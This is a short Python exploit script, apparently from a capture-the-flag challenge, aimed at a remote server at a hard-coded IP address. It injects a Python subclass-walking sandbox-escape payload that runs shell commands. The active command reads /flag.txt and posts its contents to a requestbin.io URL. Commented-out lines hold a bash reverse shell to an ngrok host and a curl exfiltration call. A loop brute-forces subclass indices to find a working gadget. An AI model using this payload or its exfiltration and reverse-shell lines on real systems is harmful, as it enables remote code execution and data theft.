import requests
# url = "http://127.0.0.1:4444/?text=().__class__.__bases__[0].__subclasses__()[%s]('curl -X POST -d \"fizz=buzz\" https://requestbin.io/u73f9vu7', shell=True)"
# x = "/bin/bash -i >& /dev/tcp/4.tcp.ngrok.io/19549 0>&1"
x = r"""python3 -c \'import requests;import os;a=os.popen("cat /flag.txt").read();requests.post("https://requestbin.io/1lk2z6u1",json={"asd":a})\'"""
print(x)
url = f"http://103.189.235.186:10006/?text=().__class__.__bases__[0].__subclasses__()[%s]('{x}', shell=True)"

def req(x):
    # res = requests.get(url % (x, x))
    res = requests.get(url % (x))
    return res.status_code, res.text


def brute():
    for i in range(300,400):
        n, m = req(i)
        if n == 200:
            print(i)
            print(n)
            print(m)

# brute()


print(req('358'))
